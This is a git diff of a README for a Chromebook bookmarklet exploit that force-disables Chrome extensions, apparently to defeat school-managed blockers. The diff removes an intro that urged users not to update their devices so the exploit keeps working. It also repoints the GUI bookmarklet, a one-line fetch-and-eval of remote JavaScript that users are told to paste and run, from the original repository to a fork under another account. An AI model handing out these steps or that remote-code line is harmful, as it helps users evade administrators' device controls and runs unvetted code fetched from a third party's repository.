@@ -1,17 +1,5 @@
 # ext remover
 
-## ATTENTION ALL SYS ADMINS!!! 
-
-Hello, I am Echo and I created this repo in order to give exploits for the masses and to prove one thing, chromebooks are literal trash, and a poor excuse for a computer. They are full of exploits, you might think you blocked/patched them all but then 3 more pop up. It is a endless game of wack-a-mole. Treat your students to a windows computer, they will thank you. And don't you dare start to think "My school district does not have that kind of money", it most likely does! How much are you paying the blocker companies? Think about that.
-
-## Back to your scheduled programming
-
-![image](https://user-images.githubusercontent.com/58097612/191354621-bf7ff072-b9d7-46b5-994a-4d2adbf0e4f3.png)
-
-Bookmarklet exploit that can force-disable any extension installed on Google Chrome. Also known as LTBEEF. And for some reason I put a unenroll exploit aswell yippee
-
-**DO NOT UPDATE YOUR CHROMEBOOK! This exploit has been patched in versions 106 and above, so do not update!** If you version is above 106, [try this method](https://github.com/3kh0/ext-remover#v106-and-above)
-
 If you need any help, please go here: https://github.com/3kh0/ext-remover/discussions
 
 ## Instructions
@@ -39,10 +27,12 @@ javascript:(function () {var a = document.createElement('script');a.src = 'https
 
 Credit to CompactCow#4717 for the amazing UI!
 
+I updated the theme - Dread#4185
+
 1. Right click on the bar and choose `Add Page`
 1. Set the name to `GUI` and the URL to the code below or [here](https://github.com/3kh0/ext-remover/blob/main/gui.js)
 ```js
-javascript:fetch(`https://raw.githubusercontent.com/3kh0/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
+javascript:fetch(`https://raw.githubusercontent.com/qDread-dev/ext-remover/main/exploit.js`).then(data=>{data.text().then(text=>{eval(text)})});
 ```
 3. Visit https://chrome.google.com/webstorex. (This is a 404 page, and that is ok.)
 4. Click the bookmark (Make sure you are on the page above!)
